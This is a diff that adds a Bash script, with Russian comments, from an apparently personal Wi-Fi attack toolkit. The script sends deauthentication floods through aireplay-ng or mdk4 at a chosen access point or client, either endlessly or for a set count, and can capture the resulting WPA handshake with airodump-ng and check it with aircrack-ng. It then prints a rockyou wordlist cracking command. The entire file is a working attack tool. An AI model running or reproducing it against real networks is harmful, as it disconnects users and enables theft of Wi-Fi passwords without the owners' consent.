@@ -1,0 +1,252 @@
+#!/usr/bin/env bash
+# ============================================================================
+#  wlab deauth — один инструмент вместо трёх (wdeaut / wtaak / watak)
+#
+#  wlab deauth -b AA:BB:CC:DD:EE:FF -c 6            бесконечно, до Ctrl+C
+#  wlab deauth -b AA:BB:CC:DD:EE:FF -c 6 -n 10      10 пакетов
+#  wlab deauth -b AA:BB:CC:DD:EE:FF -c 6 -t MAC     только одному клиенту
+#  wlab deauth -b AA:BB:CC:DD:EE:FF -c 6 -w         + ловить хендшейк
+# ============================================================================
+set -euo pipefail
+
+SELF=$(readlink -f "${BASH_SOURCE[0]}")
+export WLAB_ROOT="${WLAB_ROOT:-$(dirname "$(dirname "$SELF")")}"
+# shellcheck source=/dev/null
+source "$WLAB_ROOT/lib/wlab_lib.sh"
+wlab_load_conf
+wlab_need_root "$SELF" "$@"
+wlab_dirs
+
+BSSID=""
+TARGET=""
+CH=""
+COUNT=0          # 0 = бесконечно, как в старом wtaak
+CAPTURE=0
+OUTBASE=""
+TIMEOUT=60
+IFC="$IFACE_MON"
+BLIND=1          # по умолчанию шлём сразу, без ожидания beacon
+KILL=0
+ENGINE="auto"
+
+usage() {
+  cat <<EOF
+Использование: wlab deauth -b BSSID [опции]
+
+  -b, --bssid MAC   BSSID точки (обязательно)
+  -t, --target MAC  бить только одного клиента (по умолчанию вся сеть)
+  -c, --channel N   канал точки (если не задан — найдём автоматически)
+  -n, --count N     сколько пакетов (0 = бесконечно, по умолчанию 0)
+  -w, --capture     параллельно ловить хендшейк в .cap
+  -o, --out NAME    базовое имя файла захвата
+      --timeout N   сколько секунд ждать хендшейк (по умолчанию $TIMEOUT)
+  -i, --iface IF    адаптер (по умолчанию $IFACE_MON)
+      --blind       шлёшь сразу, без ожидания beacon (включено по умолчанию)
+      --wait-beacon сначала дождаться beacon от AP, потом слать
+      --kill        прибить NetworkManager и wpa_supplicant (если адаптер занят)
+      --engine E    движок: auto | mdk4 | aireplay (по умолчанию auto)
+  -h, --help        эта справка
+
+Ctrl+C — остановить.
+EOF
+}
+
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    -b|--bssid)   BSSID="${2:?нет значения для $1}"; shift 2 ;;
+    -t|--target)  TARGET="${2:?нет значения для $1}"; shift 2 ;;
+    -c|--channel) CH="${2:?нет значения для $1}"; shift 2 ;;
+    -n|--count)   COUNT="${2:?нет значения для $1}"; shift 2 ;;
+    -w|--capture) CAPTURE=1; shift ;;
+    -o|--out)     OUTBASE="${2:?нет значения для $1}"; shift 2 ;;
+    --timeout)    TIMEOUT="${2:?нет значения для $1}"; shift 2 ;;
+    -i|--iface)   IFC="${2:?нет значения для $1}"; shift 2 ;;
+    --blind)      BLIND=1; shift ;;
+    --wait|--wait-beacon) BLIND=0; shift ;;
+    --kill)       KILL=1; shift ;;
+    --engine)     ENGINE="${2:?нет значения для $1}"; shift 2 ;;
+    -h|--help)    usage; exit 0 ;;
+    *)            wlab_die "неизвестная опция: $1" ;;
+  esac
+done
+
+[[ -n "$BSSID" ]] || { usage; exit 1; }
+[[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || wlab_die "BSSID кривой: $BSSID"
+wlab_uint "$COUNT" || wlab_die "count должен быть числом"
+wlab_uint "$TIMEOUT" || wlab_die "timeout должен быть числом"
+
+# FF:FF:... == вся сеть, это не target
+if [[ "$TARGET" == "FF:FF:FF:FF:FF:FF" ]]; then TARGET=""; fi
+if [[ -n "$TARGET" ]]; then
+  [[ "$TARGET" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || wlab_die "target MAC кривой: $TARGET"
+fi
+
+wlab_require_cmds aireplay-ng aircrack-ng iw ip || exit 1
+
+AD_PID=""
+AP_PID=""
+WARN_PID=""
+CLEANED=0
+CAP_FILE=""
+LOG="$WLAB_STATE/caps/aireplay.log"
+
+cleanup() {
+  [[ $CLEANED -eq 1 ]] && return 0
+  CLEANED=1
+  [[ -n "$WARN_PID" ]] && kill "$WARN_PID" 2>/dev/null || true
+  [[ -n "$AP_PID" ]] && kill "$AP_PID" 2>/dev/null || true
+  if [[ -n "$AD_PID" ]]; then
+    kill "$AD_PID" 2>/dev/null || true
+    wait "$AD_PID" 2>/dev/null || true
+  fi
+  wlab_mon_off "$IFC"
+}
+trap cleanup EXIT
+trap 'cleanup; exit 0' INT TERM
+
+if [[ $KILL -eq 1 ]]; then
+  wlab_warn "airmon-ng check kill: NetworkManager и wpa_supplicant будут остановлены"
+  airmon-ng check kill >/dev/null 2>&1 || true
+  sleep 1
+fi
+
+wlab_mon_on "$IFC"
+
+# канал не задан — найдём сами, вместо угадывания
+if [[ -z "$CH" ]]; then
+  wlab_info "канал не задан — ищу $BSSID в эфире (до 15 сек)..."
+  if CH=$(wlab_find_channel "$BSSID" "$IFC"); then
+    wlab_ok "канал найден: $CH"
+  else
+    CH=""
+    wlab_err "не нашёл $BSSID в эфире"
+    wlab_info "проверь: точка включена? адаптер слышит? (wlab scan -i $IFC)"
+    exit 1
+  fi
+fi
+
+wlab_set_channel "$IFC" "$CH"
+actual=$(iw dev "$IFC" info 2>/dev/null | awk '/channel/ {print $2; exit}' || true)
+if [[ -n "$actual" && "$actual" != "$CH" ]]; then
+  wlab_warn "канал сбросился на $actual вместо $CH — повторяю"
+  wlab_set_channel "$IFC" "$CH"
+  sleep 0.5
+fi
+wlab_ok "$IFC: monitor, канал $CH"
+
+# --- ловля хендшейка (airodump в фоне) --------------------------------------
+if [[ $CAPTURE -eq 1 ]]; then
+  if [[ -z "$OUTBASE" ]]; then
+    OUTBASE="$WLAB_STATE/caps/hs_$(date +%Y%m%d_%H%M%S)"
+  fi
+  CAP_FILE="$OUTBASE-01.cap"
+  AD_ARGS=(-w "$OUTBASE" --output-format pcap)
+  [[ -n "$CH" ]] && AD_ARGS+=(-c "$CH")
+  airodump-ng "${AD_ARGS[@]}" --bssid "$BSSID" "$IFC" >/dev/null 2>&1 &
+  AD_PID=$!
+  wlab_info "airodump пишет в $CAP_FILE"
+  sleep 3
+fi
+
+# --- деаут ------------------------------------------------------------------
+ARGS=(--ignore-negative-one --deauth "$COUNT" -a "$BSSID")
+[[ -n "$TARGET" ]] && ARGS+=(-c "$TARGET")
+[[ $BLIND -eq 1 ]] && ARGS+=(-D)
+
+if [[ "$COUNT" == "0" ]]; then
+  wlab_info "деаут без ограничения — остановить Ctrl+C"
+else
+  wlab_info "деаут: $COUNT пакетов"
+fi
+
+mkdir -p "$WLAB_STATE/caps" 2>/dev/null || true
+: > "$LOG"
+
+# ещё раз ставим канал прямо перед запуском: NM любит сбросить
+[[ -n "$CH" ]] && wlab_set_channel "$IFC" "$CH" 2>/dev/null || true
+
+# движок: aireplay проверен на этом железе; mdk4 только по явному запросу
+if [[ "$ENGINE" == "auto" ]]; then
+  ENGINE="aireplay"
+fi
+
+if [[ "$ENGINE" == "mdk4" ]]; then
+  CMD=(mdk4 "$IFC" d -c "$CH" -b "$BSSID")
+else
+  CMD=(aireplay-ng "${ARGS[@]}" "$IFC")
+fi
+
+wlab_info "движок: $ENGINE"
+wlab_info "${CMD[*]}"
+wlab_log deauth start "bssid=$BSSID" "target=${TARGET:-broadcast}" "count=$COUNT" "iface=$IFC" "engine=$ENGINE"
+
+"${CMD[@]}" > "$LOG" 2>&1 &
+AP_PID=$!
+
+# если за 45 секунд не ушло ни одного пакета — подсказать, что проверить
+# (aireplay на USB-адаптерах стартует с задержкой до ~30 сек)
+(
+  sleep 45
+  if kill -0 "$AP_PID" 2>/dev/null && ! grep -q "Sending DeAuth" "$LOG" 2>/dev/null; then
+    real=$(iw dev "$IFC" info 2>/dev/null | awk '/channel/ {print $2; exit}' || true)
+    printf '\n%s[!]%s aireplay не отправил ни одного пакета за 45 сек.\n' "$C_YEL" "$C_R" >&2
+    printf '    Ожидался канал %s, фактический у %s: %s\n' "${CH:-?}" "$IFC" "${real:-?}" >&2
+    printf '    Проверь инъекцию отдельной командой:\n' >&2
+    printf '      sudo aireplay-ng -9 -a %s %s\n' "$BSSID" "$IFC" >&2
+    if grep -q "Waiting for beacon" "$LOG" 2>/dev/null; then
+      printf '    (%s висит на beacon — карта не видит AP на этом канале)\n' "aireplay" >&2
+    fi
+  fi
+) &
+WARN_PID=$!
+
+# --- проверка захвата в фоне ------------------------------------------------
+poll_handshake() {
+  local cap=$1 pid=$2 i out
+  for ((i = 0; i < TIMEOUT; i += 2)); do
+    kill -0 "$pid" 2>/dev/null || return 1
+    if [[ -f "$cap" ]]; then
+      out=$(aircrack-ng "$cap" 2>/dev/null || true)
+      if grep -qE '[1-9][0-9]* handshake' <<< "$out"; then
+        printf '\n%s[+] ХЕНДШЕЙК ПОЙМАН: %s%s\n' "$C_GRN" "$cap" "$C_R" >&2
+        wlab_log deauth handshake "file=$cap" "bssid=$BSSID"
+        kill "$pid" 2>/dev/null || true
+        return 0
+      fi
+    fi
+    sleep 2
+  done
+  printf '\n%s[-] хендшейк не пойман за %ss%s\n' "$C_RED" "$TIMEOUT" "$C_R" >&2
+  kill "$pid" 2>/dev/null || true
+  return 1
+}
+
+if [[ $CAPTURE -eq 1 ]]; then
+  ( poll_handshake "$CAP_FILE" "$AP_PID" ) &
+fi
+
+# --- живой вывод пакетов ----------------------------------------------------
+wlab_hr
+printf '%s[живой вывод aireplay — Ctrl+C для остановки]%s\n' "$C_DIM" "$C_R" >&2
+tail -n +1 -f "$LOG" --pid="$AP_PID" 2>/dev/null \
+  | sed -u -r 's/\x1B\[[0-9;]*[A-Za-z]//g' \
+  | tr '\r' '\n' || true
+
+wait "$AP_PID" 2>/dev/null || true
+kill "$WARN_PID" 2>/dev/null || true
+
+# --- итог -------------------------------------------------------------------
+if [[ $CAPTURE -eq 1 && -n "$CAP_FILE" && -f "$CAP_FILE" ]]; then
+  # ВАЖНО: не через пайп в grep -q — pipefail поймает SIGPIPE (141) и соврёт
+  final_out=$(aircrack-ng "$CAP_FILE" 2>/dev/null || true)
+  if grep -qE '[1-9][0-9]* handshake' <<< "$final_out"; then
+    wlab_ok "хендшейк есть: $CAP_FILE"
+    echo
+    wlab_info "дальше: aircrack-ng -w /usr/share/wordlists/rockyou.txt $CAP_FILE"
+  else
+    wlab_err "хендшейка нет"
+    wlab_info "проверь: клиент реально переподключился? канал верный? не 802.11w (PMF)?"
+  fi
+fi
+
+wlab_log deauth stop "bssid=$BSSID"
